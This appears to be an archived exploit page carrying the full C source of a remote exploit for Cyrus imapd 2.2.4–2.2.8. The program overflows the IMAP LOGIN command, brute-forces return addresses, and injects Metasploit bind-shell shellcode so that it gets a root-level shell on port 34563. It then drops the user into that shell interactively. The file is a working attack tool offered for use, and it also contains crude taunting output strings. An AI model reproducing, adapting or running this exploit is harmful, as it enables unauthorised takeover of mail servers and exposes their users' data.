<html><head><title>Cyrus imapd 2.2.4 - 2.2.8 (imapmagicplus) Remote Exploit</title></head><pre>/********************************************************************************************
 *                                                                                          *
 *                 Cyrus imapd v 2.2.4 - 2.2.8 (imapmagicplus) Remote Exploit               *
 *                                  By crash-x / unl0ck                                     *
 *                               Bug found by Stefan Esser                                  *
 *                           www.unl0ck.org / www.coredumped.info                           *
 *                          crash-x@unl0ck.org / crash.ix@gmail.com                         *
 *                                                                                          *
 * Greets to:  all GOTFault ex-member, unl0ck, scozar, eos-india, xesio and all my other    *
 *             friends                                                                      *
 *                                                                                          *
 * Thanks to:  n2n                                                                          *
 *                                                                                          *
 * Why:        This was GOTFault code but Im releasing it with unl0ck. The only reason      *
 *             Im releasing it is that somebody leaked it. We didnt want to release any     *
 *             GOTFault stuff or give it to anyone besides GOTFault members. But somehow    *
 *             stuff got leaked and we had some problems in the team. tal0n disappeared     *
 *             and GOTFault doesnt exist anymore.                                           *
 *             Im sorry about GOTFault and I hope tal0n has a good time wherever he is and  *
 *             whatever he is doing.                                                        *
 *                                                                                          *
 ********************************************************************************************/

#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;stdarg.h&gt;
#include &lt;string.h&gt;
#include &lt;sys/types.h&gt;
#include &lt;sys/socket.h&gt;
#include &lt;sys/time.h&gt;
#include &lt;netinet/in.h&gt;
#include &lt;arpa/inet.h&gt;
#include &lt;unistd.h&gt;
#include &lt;netdb.h&gt;

#define RET_BF_START 0x08000000
#define RET_BF_END 0x08600000

#define SHELL_PORT &quot;34563&quot;
#define SHELL_COMMAND &quot;uname -a; id;&quot;

char shellcode[] = /* thanks metasploit! */
&quot;\xd9\xee\xd9\x74\x24\xf4\x5b\x31\xc9\xb1\x16\x81\x73\x17\xb4\x1e&quot;
&quot;\xc2\x86\x83\xeb\xfc\xe2\xf4\x85\xc5\x35\x65\x04\x78\x91\xc5\xe7&quot;
&quot;\x5d\x91\x0f\x55\x55\x0f\x06\x3d\xd9\x90\xe0\xdc\x99\xc1\xc5\xd2&quot;
&quot;\x4d\x4b\x67\x04\x0e\x92\xd7\xe3\x97\x23\x36\xd2\xd3\x42\x36\xd2&quot;
&quot;\xad\xc6\x4b\x34\x4e\x92\xd1\x3d\xff\x81\x36\xd2\xd3\x42\x0f\x6d&quot;
&quot;\x97\x01\x36\x8b\x57\x0f\x06\xf5\xfc\x3a\xd7\xdc\x70\xed\xf5\xdc&quot;
&quot;\x76\xed\xa9\xd6\x77\x4b\x65\xe5\x4d\x4b\x67\x04\x15\x0f\x06&quot;;


struct targ{
    char *platform;
    int retloc; 
} targets[]= {
    { &quot;Debian 3.1 - Cyrus imapd 2.2.8&quot;, 0x0812893c },
    { NULL }
};


void usage(char *a){
    int i;

    printf(&quot;[-] Usage: %s -h &lt;host&gt; [options]\n&quot;, a);
    printf(&quot;[!] Options:\n&quot;);
    printf(&quot;\t\t-h\tHostname which you want attack (required)\n&quot;);
    printf(&quot;\t\t-p\tPort of the imapd (default: 143)\n&quot;);
    printf(&quot;\t\t-t\tTarget (default: 0)\n&quot;);
    printf(&quot;\t\t-S\tBruteforce start address (default: 0x%x)\n&quot;, RET_BF_START);
    printf(&quot;\t\t-E\tBruteforce end address (default: 0x%x)\n&quot;, RET_BF_END);
    printf(&quot;\t\t-P\tPayload size (default: 10000)\n&quot;);
    printf(&quot;\t\t-s\tHow long to sleep before try connect to shell (default: 1)\n&quot;);
    printf(&quot;\t\t-v\tOnly vulncheck\n&quot;);
    printf(&quot;\t\t-V\tNo vulncheck\n&quot;);
    printf(&quot;[!] Targets:\n&quot;);
    for(i = 0; targets[i].platform; i++)
        printf(&quot;\t\t%d\t %s\n&quot;, i, targets[i].platform);
    printf(&quot;\t\t1337\t All Linux Distros (bruteforce)\n&quot;);
    exit(1);
}
    
int sockprintf(int sock, const char *s, ...){
    char *ptr;
    int bytes;
    va_list arg;
    va_start(arg, s);
    if(vasprintf(&amp;ptr, s, arg) == -1){
        free(ptr);
        return -1;
    }
    va_end(arg);
    if((bytes = send(sock, ptr, strlen(ptr), 0)) == -1){
        free(ptr);
        return -1;
    }
    free(ptr);
    return bytes;
}


void check(char *ptr){
    int i;

    for(i = 0; i &lt; strlen(ptr); i++){
        switch(ptr[i]){
            case '\x00':
                ptr[i] = 0x01;
                break;
            case '\x09': 
                ptr[i] = 0x08;
                break;
            case '\x0a': 
                ptr[i] = 0x0e;
                break;
            case '\x0b':
                ptr[i] = 0x0e;
                break;
            case '\x0c': 
                ptr[i] = 0x0e;
                break;
            case '\x0d': 
                ptr[i] = 0x0e;
                break;
            case '\x20': 
                ptr[i] = 0x21;
                break;
            case '\x22': 
                ptr[i] = 0x23;
                break;
            case '\x28':
                ptr[i] = 0x27;
                break;
            case '\x29':
                ptr[i] = 0x30;
                break;
        }
    }
}


int resolv(struct sockaddr_in *addr, char *hostn){
	struct hostent *host;

    if (!inet_aton(hostn, &amp;addr-&gt;sin_addr)){
        host = gethostbyname(hostn);
        if (host == NULL){
            printf(&quot;[-] Wasnt able to resolve %s!\n&quot;, hostn);
            return -1;
        }
        addr-&gt;sin_addr = *(struct in_addr*)host-&gt;h_addr;
    }
}


int conn(struct sockaddr_in addr, int port){
    int sock;
    
    if((sock = socket(PF_INET, SOCK_STREAM, 0)) == -1){
        return -1;
    }

    addr.sin_port = htons(port);
    addr.sin_family = AF_INET;

    if (connect(sock, (struct sockaddr*)&amp;addr, sizeof(addr)) == -1){
        return -1;
	}
    return sock;
}


int get_shell(struct sockaddr_in addr, int port, int sleeps){
    int sock;
    char buffer[1024];
    fd_set fds;

    sleep(sleeps);

    if((sock = conn(addr, port)) == -1)
        return (-1);
    printf(&quot;[+]\n[+] Wooohooo we got a shell!\n&quot;);
    sockprintf(sock, SHELL_COMMAND&quot;\r\n&quot;);
    while(1){
        FD_ZERO(&amp;fds);
        FD_SET(0, &amp;fds);
        FD_SET(sock, &amp;fds);

        if (select(255, &amp;fds, NULL, NULL, NULL) == -1){
            fprintf(stderr,&quot;[-] sending failed\n&quot;);
            close(sock);
            exit(1);
        }

        memset(buffer, 0x0, sizeof(buffer));
        if (FD_ISSET(sock, &amp;fds)){
            if (recv(sock, buffer, sizeof(buffer), 0) == -1){
                fprintf(stderr, &quot;[-] Connection closed by remote host!\n&quot;);
                close(sock);
                exit(1);
            }
            fprintf(stderr, &quot;%s&quot;, buffer);
        }

        if (FD_ISSET(0, &amp;fds)){
            read(0, buffer, sizeof(buffer));
            write(sock, buffer, strlen(buffer));
        }
    }
    return 0;
}


void status(int retloc, int retloc2, int retaddr){
    static int l=1;

    switch(l){
        case 1:
            printf(&quot;[|] &quot;);
            break;
        case 2:
            printf(&quot;[/] &quot;);
            break;
        case 3:
            printf(&quot;[-] &quot;);
            break;
        case 4:
            printf(&quot;[\\] &quot;);
            l = 0;
            break;
    }
    printf(&quot;Trying retlocs [0x%x - 0x%x] retaddr [0x%x]\r&quot;, retloc, retloc2, retaddr);
    fflush(stdout);
    l++;
}

void gen_payload(char *payload, int p_size, int retloc, int mode){
    int i;

    memset(payload, 0x0, p_size);
    memcpy(payload, &quot;L01 LOGIN &quot;, strlen(&quot;L01 LOGIN &quot;));
    /* mode == 0 is vulncheck buffer and 1 is attack buffer */
    if(mode == 0)
        memset(payload+strlen(&quot;L01 LOGIN &quot;), 'A', p_size-strlen(&quot;L01 LOGIN &quot;));
    else{
        for(i=strlen(&quot;L01 LOGIN &quot;); i &lt; (p_size-(p_size/10)); i+=4)
            *((void **)(payload+i)) = (void *)((retloc+(p_size-(p_size/10/2))));
        memset(payload+i, '\x90', p_size-i);
        *((void **)(payload+562)) = (void *)(retloc);
        payload[p_size-5] = '\0';
        check(payload + strlen(&quot;L01 LOGIN &quot;));
    }
    memcpy(payload+p_size-strlen(shellcode)-strlen(&quot; {5}&quot;)-1, shellcode, strlen(shellcode));
    memcpy(payload+p_size-strlen(&quot; {5}&quot;)-1, &quot; {5}&quot;, strlen(&quot; {5}&quot;));
    payload[p_size-1] = '\0';
}
    
void vulnchck(struct sockaddr_in addr, int port){
    char payload[1024];
    int sock;
    struct timeval timeout;
    fd_set fds;

    timeout.tv_sec = 3;
    timeout.tv_usec = 0;

    printf(&quot;[!] Checking if the server is vuln!\n&quot;);
    if((sock = conn(addr, port)) == -1){
        printf(&quot;[-] Connecting failed!\n&quot;);
        exit(1);
    }
    gen_payload(payload, sizeof(payload), 0x00, 0);
    sockprintf(sock, &quot;%s\r\n&quot;, payload);
    if(recv(sock, payload, sizeof(payload), 0) &lt; 1){
        printf(&quot;[+] Yeaahaa server is vuln, lets fuck that bitch!\n&quot;);
        close(sock);
        return;
    }
    printf(&quot;[-] Server not vuln!\n&quot;);
    close(sock);
    exit(1);
}


int main(int argc, char **argv){
    char *payload = NULL, *hostn = NULL, buffer[1024], *ptr;
    int i, first, sock, opt, target = 0, port = 143,
        shell_port = atoi(SHELL_PORT), sleeps = 1, 
        p_size=10000, ret_bf_start = RET_BF_START, 
        ret_bf_end = RET_BF_END, vulncheck = 1; 
    fd_set fds;
	struct sockaddr_in addr;
  
    printf(&quot;[!] Cyrus imapd 2.2.4 - 2.2.8 remote exploit by crash-x / unl0ck\n&quot;);

    if (argc &lt; 2)
        usage(argv[0]);
    
    while ((opt = getopt (argc, argv, &quot;h:p:t:s:P:S:E:vV&quot;)) != -1){
        switch (opt){
	        case 'h':
	            hostn = optarg;
	            break;
	        case 'p':
                port = atoi(optarg);
                if(port &gt; 65535 || port &lt; 1){
                    printf(&quot;[-] Port %d is invalid\n&quot;,port);
                    return 1;
                }
                break;
            case 't':
                target = atoi(optarg);
                for(i = 0; targets[i].platform; i++);
                if(target &gt;= i &amp;&amp; target != 1337){
                    printf(&quot;[-] Wtf are you trying to target?\n&quot;);
                    usage(argv[0]);
                }
                break;
            case 'S':
                ret_bf_start = strtoul(optarg,NULL,0);
                if(!ret_bf_start){
                    printf(&quot;[-] Wtf thats not a valid bruteforce start address!\n&quot;);
                    usage(argv[0]);
                }
                break;
            case 'E':
                ret_bf_end = strtoul(optarg,NULL,0);
                if(!ret_bf_end){
                    printf(&quot;[-] Wtf thats not a valid bruteforce end address!\n&quot;);
                    usage(argv[0]);
                }
                break;
            case 's': 
                sleeps = atoi(optarg);
                break;
            case 'P': 
                p_size = atoi(optarg);
                if(p_size &lt; 1000){
                    printf(&quot;[-] Its a bad idea to have a payload with less than 1000 bytes :)\n&quot;);
                    return 1;
                }
                break;
            case 'v':
                vulncheck = 2;
                break;
            case 'V':
                vulncheck = 0;
                break;
        	default:
                usage(argv[0]);
        }
    }

    if(hostn == NULL)
        usage(argv[0]);

    if(payload == NULL){
        if(!(payload = malloc(p_size))){
            printf(&quot;[-] Wasnt able to allocate space for the payload!\n&quot;);
            return 1;
        }
    }

    resolv(&amp;addr, hostn);

    if(vulncheck == 2){
        vulnchck(addr, port);
        return 1;
    }
    else if(vulncheck == 1)
        vulnchck(addr, port);

    if(target != 1337){
        ret_bf_start = targets[target].retloc;
        ret_bf_end = targets[target].retloc+5;
        printf (&quot;[!] Targeting %s\n&quot;, targets[target].platform);
    } else
        printf(&quot;[!] Starting bruteforce attack!\n&quot;);

    for(i = 0, first = 1; ret_bf_start &lt; ret_bf_end; i++, first++){
        if((sock = conn(addr, port)) == -1){
            if(first != 1)
                printf(&quot;\n&quot;);
            printf(&quot;[-] Connecting failed!\n&quot;);
            break;
        }
        if(i == 4)
            ret_bf_start += (p_size -  (p_size/10));
        else
            ret_bf_start++;
        gen_payload(payload, p_size, ret_bf_start, 1);
        status(ret_bf_start, ret_bf_start + (p_size - (p_size/10)),
                ret_bf_start + (p_size - (p_size/10/2)));
        sockprintf(sock, &quot;%s\r\n&quot;, payload);
        if(i == 4){
            get_shell(addr, shell_port, sleeps);
            i = 0;
        }
        if(ret_bf_start &gt;=  ret_bf_end)
            printf(&quot;[-]\n&quot;);
        close(sock);
    }
    printf(&quot;[-] Exploit failed!\n&quot;);
    return 1;
}

// milw0rm.com [2005-03-29]</pre></html>